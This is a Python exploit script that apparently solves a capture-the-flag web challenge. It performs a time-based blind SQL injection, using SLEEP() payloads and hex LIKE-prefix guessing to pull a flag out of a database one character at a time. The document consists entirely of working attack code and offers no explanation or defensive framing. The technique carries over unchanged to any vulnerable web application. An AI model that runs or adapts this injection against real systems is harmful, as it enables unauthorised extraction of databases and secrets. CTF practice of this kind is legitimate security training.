#!/usr/bin/env python3

from Inj import Inj
from time import time

inj = Inj('http://web-17.challs.olicyber.it')

def sqli(where):
    ret = "1' AND (SELECT SLEEP(1) from flags where {})='1".format(where)
    return ret

def dd(s):
    return bytes.fromhex(s).decode('utf-8')

def match_time(where):
    start = time()
    response,error = inj.time(sqli(where))
    return time() - start > 1

print("First try to get a succes standard result (id=1)")
response, error = inj.blind('1')
print(response)

dictionary =  "0123456789abcdef";

result = ""

while True:
    for c in dictionary:
        if match_time((f"hex(flag) like '{result+c}%'")):
            print("\nWe found a match: ", c)
            result += c
            print("Partial flag in hex is {}".format(result))
            if len(result) % 2 == 0:
                print("Partial Flag in string is:", dd(result))
            break
    else:
        break
    
print("Flag is:", dd(result))
